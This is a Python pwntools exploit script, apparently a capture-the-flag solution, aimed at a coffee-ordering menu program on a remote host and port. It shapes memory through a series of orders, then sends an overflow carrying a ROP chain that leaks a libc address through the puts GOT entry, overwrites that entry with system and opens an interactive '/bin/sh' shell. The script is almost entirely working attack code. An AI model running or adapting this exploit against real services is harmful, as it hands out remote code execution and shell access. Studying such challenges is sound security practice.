#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.6"
#port = 8888
host = "139.59.241.86"
port = 31334
r = remote(host,port)

#need a little bruteforc
#about 1/16 chance

def order(sir,cup,wait=None,exp=None):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("sir?")
    r.sendline(sir)
    r.recvuntil(">")
    r.sendline(str(len(cup)))
    if wait :
        log.info("wait")
        time.sleep(2)
    r.recvuntil("(Y/N)")
    r.sendline("y")
    cnt = 0
    for c in cup :
        cnt +=1
        r.recvuntil(">")
        r.sendline(str(c[0]))
        if exp and cnt == 3:
            return
        r.recvuntil(">")
        r.sendline(str(c[1]))
        r.recvuntil(">")
        r.sendline(str(c[2]))
        r.recvuntil(">")
        r.sendline(str(c[3]))
        r.recvuntil(">")
        r.sendline(str(c[4]))

def pay():
    r.recvuntil(">")
    r.sendline("2")

# type : black,milk,coconut
# type,suger,milk,iced,size
c = [3,0,0,0,0]
b = [1,30,20,50,3]
d = [65,65,65,65,65]
e = [0x20,0,0,0x60,0]
f = [0x03,0,0,0,0]
order("y",[c,c,c,c,c,c,c])
pay()
order("y",[c,c,c,c])
pay()
order("y",[c,c,c,c,c,c,c,c,c,c,c,c,c,c])
pay()
order("y",[c,c,c])
pay()
order("y",[c])
pay()
order("y",[c])
pay()
order("y",[c,c,c,b])
pay()
puts = 0x400980
read = 0x4009c0
puts_got = 0x602030

pop_rdi = 0x0000000000401573
pop_rsi_r15 = 0x0000000000401571
context.arch = "amd64"
rop = flat([pop_rdi,puts_got,puts,pop_rdi,0,pop_rsi_r15,puts_got,0,read,pop_rdi,puts_got+8,puts])
order("b"*48+rop,[e,d,f],1,1)
r.recvuntil("Which one, sir? (1,2,3) > ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x6f690
print "libc:",hex(libc)
system = libc + 0x45390
r.sendline(p64(system) + "/bin/sh\x00")
r.interactive()
